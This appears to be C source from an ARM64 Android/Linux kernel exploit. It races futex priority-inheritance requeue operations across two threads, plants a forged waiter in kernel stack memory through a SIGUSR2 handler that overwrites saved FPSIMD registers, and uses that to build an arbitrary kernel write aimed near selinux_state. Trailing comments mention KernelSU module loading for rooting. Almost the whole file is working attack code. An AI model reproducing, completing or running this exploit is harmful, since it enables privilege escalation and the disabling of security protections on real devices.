#include "common.h"

long raw_futex(volatile int *u1, long op, long val, long val2,
                      volatile int *u2, long val3) {
  register long x0 __asm__("x0") = (long)u1;
  register long x1 __asm__("x1") = op;
  register long x2 __asm__("x2") = val;
  register long x3 __asm__("x3") = val2;
  register long x4 __asm__("x4") = (long)u2;
  register long x5 __asm__("x5") = val3;
  register long x8 __asm__("x8") = 98;
  __asm__ volatile("svc #0" : "+r"(x0) : "r"(x1), "r"(x2), "r"(x3),
                   "r"(x4), "r"(x5), "r"(x8) : "memory", "cc");
  return x0;
}

long raw_sched_setscheduler(int tid, int policy,
                                   struct sched_param *param) {
  register long x0 __asm__("x0") = tid;
  register long x1 __asm__("x1") = policy;
  register long x2 __asm__("x2") = (long)param;
  register long x8 __asm__("x8") = 119;
  __asm__ volatile("svc #0" : "+r"(x0) : "r"(x1), "r"(x2), "r"(x8)
                   : "memory", "cc");
  return x0;
}


void cpu_yield(void) {
  __asm__ volatile("yield" ::: "memory");
}

struct k_fpsimd_context {
  uint32_t magic, size, fpsr, fpcr;
  uint8_t vregs[32 * 16];
};

struct k_fpsimd_context *find_fpsimd(unsigned char *p,
                                            unsigned char *end) {
  while ((size_t)(end - p) >= 8) {
    uint32_t magic, size;
    memcpy(&magic, p, 4); memcpy(&size, p + 4, 4);
    if (!magic && !size) return NULL;
    if (size < 8 || (size & 15) || (size_t)(end - p) < size) return NULL;
    if (magic == UINT32_C(0x46508001) && size >= 0x210)
      return (struct k_fpsimd_context *)(void *)p;
    p += size;
  }
  return NULL;
}

void sigusr2(int sig, siginfo_t *info, void *opaque) {
  (void)sig; (void)info;
  ucontext_t *uc = opaque;
  unsigned char *start = uc->uc_mcontext.__reserved;
  struct k_fpsimd_context *fp = find_fpsimd(start, start +
                                             sizeof(uc->uc_mcontext.__reserved));
  if (!fp || (size_t)0x108 + 0x50 > sizeof(fp->vregs)) {
    atomic_store(&stamp_status, -1); atomic_store(&stamp_done, 1); return;
  }
  uint64_t *w = (uint64_t *)(void *)(fp->vregs + 0x108);
  memset(w, 0, 0x50);
  w[0] = atomic_load(&stamp_parent);
  w[1] = atomic_load(&stamp_value);
  w[2] = 0;
  w[6] = k_ghost_task;
  w[7] = atomic_load(&stamp_lock);
  atomic_store(&stamp_status, 1);
  atomic_store(&stamp_done, 1);
}

int stamp_waiter(uint64_t parent, uint64_t value, uint64_t lock) {
  atomic_store(&stamp_parent, parent);
  atomic_store(&stamp_value, value);
  atomic_store(&stamp_lock, lock);
  atomic_store(&stamp_status, 0);
  atomic_store(&stamp_done, 0);
  (void)syscall(SYS_tgkill, process_pid, atomic_load(&y_tid), SIGUSR2);
  return atomic_load_explicit(&stamp_done, memory_order_acquire) &&
         atomic_load(&stamp_status) == 1;
}

void sigusr1(int sig) { (void)sig; }

void *thread_y(void *unused) {
  (void)unused;
  struct sigaction sa;
  memset(&sa, 0, sizeof(sa));
  sa.sa_sigaction = sigusr2;
  sa.sa_flags = SA_SIGINFO | SA_RESTART;
  sigemptyset(&sa.sa_mask);
  if (sigaction(SIGUSR2, &sa, NULL) != 0) { atomic_store(&y_task_ready, -1); return NULL; }
  int tid = (int)syscall(__NR_gettid);
  atomic_store(&y_tid, tid);
  pr_info("Thread Y spawned with TID %d\n", tid);

  char status_path[64];
  uint64_t y_cred = 0;
  snprintf(status_path, sizeof(status_path), "/proc/self/task/%d/status", tid);
  k_y_task = leak_task_from_status(status_path, &y_cred);
  uint64_t syscall_sp = leak_syscall_sp();
  k_waiter = syscall_sp ? syscall_sp - 0x1D8 : 0;
  (void)y_cred; (void)k_waiter;
  if (!k_y_task) { atomic_store(&y_task_ready, -1); return NULL; }
  atomic_store_explicit(&y_task_ready, 1, memory_order_release);
  if (y_leak_only) return NULL;

  if (raw_futex(&pi2, LOCK_PI_PRIVATE, 0, 0, NULL, 0) != 0) return NULL;
  atomic_store(&y_locked_l2, 1);
  if (!wait_atomic_ms(&x_locked_l1, 10000)) return NULL;
  atomic_store(&y_parking, 1);

  pr_info("Thread Y: waiting requeue on cond futex...\n");
  (void)raw_futex(&cond, WAIT_REQUEUE_PI_PRIVATE, 0, 0, &pi1, 0);

  pr_info("Thread Y: stamping waiter into kernel stack...\n");
  int stamped = stamp_waiter(0, 0, k_fake_lock);
  atomic_store_explicit(&y_done, stamped ? 1 : -1, memory_order_release);
  for (;;) {
    if (atomic_exchange(&respray_ready, 0)) {
      stamped = stamp_waiter(atomic_load(&respray_parent),
                             atomic_load(&respray_value),
                             atomic_load(&respray_lock));
      atomic_store_explicit(&respray_done, stamped ? 1 : -1,
                            memory_order_release);
    }
    if (atomic_load_explicit(&y_cleanup, memory_order_acquire)) break;
    cpu_yield();
  }
  int dummy = (int)(0x80000000U | (unsigned)getpid());
  struct timespec zero = {0, 0};
  (void)raw_futex(&dummy, LOCK_PI_PRIVATE, 0, (long)&zero, NULL, 0);
  (void)raw_futex(&pi2, UNLOCK_PI_PRIVATE, 0, 0, NULL, 0);
  if (!wait_atomic_ms(&x_done, 10000)) return NULL;
  return NULL;
}

void *thread_x(void *unused) {
  (void)unused;
  pr_info("Thread X spawned\n");
  if (!wait_atomic_ms(&y_locked_l2, 10000)) return NULL;
  if (raw_futex(&pi1, LOCK_PI_PRIVATE, 0, 0, NULL, 0) != 0) return NULL;
  atomic_store(&x_locked_l1, 1);
  atomic_store(&x_blocking, 1);
  pr_info("Thread X: blocking on pi2 to form deadlock...\n");
  (void)raw_futex(&pi2, LOCK_PI_PRIVATE, 0, 0, NULL, 0);
  (void)raw_futex(&pi1, UNLOCK_PI_PRIVATE, 0, 0, NULL, 0);
  (void)raw_futex(&pi2, UNLOCK_PI_PRIVATE, 0, 0, NULL, 0);
  atomic_store(&x_done, 1);
  return NULL;
}

long trigger_pi(void) {
  static int policy;
  struct sched_param p = {.sched_priority = 0};
  policy = policy == SCHED_OTHER ? SCHED_BATCH : SCHED_OTHER;
  return raw_sched_setscheduler(atomic_load(&y_tid), policy, &p);
}

int write_value(uint64_t target, uint64_t value) {
  static const unsigned windows[] = {
  0xa80, 0xb00, 0xb80, 0xc00, 0xc80,
  0xd00, 0xd80, 0xe00, 0xe80,
  0xf00,
};
  if (fake_lock_index >= sizeof(windows) / sizeof(windows[0])) {
      pr_error("Out of fake lock windows! (Index %u)\n", fake_lock_index);
  }
  k_fake_lock2 = k_selinux_state + windows[fake_lock_index++];
  atomic_store(&respray_parent, (target - 8) & ~UINT64_C(3));
  atomic_store(&respray_value, value);
  atomic_store(&respray_lock, k_fake_lock2);
  atomic_store(&respray_done, 0);

  atomic_store_explicit(&respray_ready, 1, memory_order_release);
  WAIT_UNTIL(atomic_load_explicit(&respray_done, memory_order_acquire), 10000, "PI arb-write");
  if (atomic_load(&respray_done) < 0) {
      pr_error("PI arb-write failed to stamp waiter.\n");
  }
  return trigger_pi() == 0;
}

/* ---------- KernelSU 集成：模块加载 + Manager 重启 ---------- */



/* 取路径的 basename 作为 argv[0]（bash/toybox 等多调用程序依赖它） */
